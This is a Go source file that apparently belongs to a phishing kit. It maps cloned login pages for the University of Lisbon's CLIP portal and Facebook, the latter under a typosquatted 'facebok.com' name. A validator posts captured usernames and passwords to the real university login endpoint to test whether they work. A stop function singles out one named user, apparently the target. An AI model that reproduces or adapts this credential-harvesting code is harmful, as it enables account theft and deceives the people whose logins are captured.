package build

import (
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
)

// WebsiteMap maps folder names to builder functions.
// Call the resulting function to generate the sanitized
// index.html.
var WebsiteMap = map[string]Website{

	clipUnlPtFolder: Website{

		WebsiteName: "clip.unl.pt",
		WebLink:     "https://clip.unl.pt",
		LoginURL:    "https://clip.fct.unl.pt/utente/eu",
		ShouldStop:  clipUnlComShouldStop,
		IsValid:     clipUnlComIsValid,

		ResHandleMatch: "/clip.unl.pt/__res__/",
		ResFolder:      "./clip.unl.pt/__res__/",
		IndexFile:      "./clip.unl.pt/index.html",
		IndexFileRaw:   "./clip.unl.pt/index.raw.html",
		InvalidFile:    "./clip.unl.pt/invalid.html",
		InvalidFileRaw: "./clip.unl.pt/invalid.raw.html",

		LineMatchRe: `(<link|<img|<script)`,
		ResMatchRe:  `(href=".*?"|src=".*?")`,
	},

	facebookComFolder: Website{

		WebsiteName: "facebook.com",
		WebLink:     "http://m.facebok.com",
		ShouldStop:  facebookComShouldStop,

		ResHandleMatch: "/facebok.com/__res__/",
		ResFolder:      "./facebok.com/__res__/",
		IndexFile:      "./facebok.com/index.html",
		IndexFileRaw:   "./facebok.com/index.raw.html",

		LineMatchRe: `(<link|<img|<script)`,
		ResMatchRe:  `(href=".*?"|src=".*?")`,
	},
}

func clipUnlComShouldStop(u string, p string) bool {

	targets := []string{"b.covas"}

	for _, target := range targets {
		if u == target {
			return true
		}
	}

	return false
}

func clipUnlComIsValid(u string, p string) bool {

	loginURL := "https://clip.fct.unl.pt/utente/eu"
	errMsg := "Erro no pedido"

	if u == "" || p == "" {
		return false
	}

	form := url.Values{}
	form.Add("identificador", u)
	form.Add("senha", p)

	res, err := http.PostForm(loginURL, form)

	if err != nil {
		log.Println(err)
		return false
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Println(err)
		return false
	}

	if strings.Contains(string(body), errMsg) {
		return false
	}

	return true
}

func facebookComShouldStop(u string, p string) bool {
	return false
}
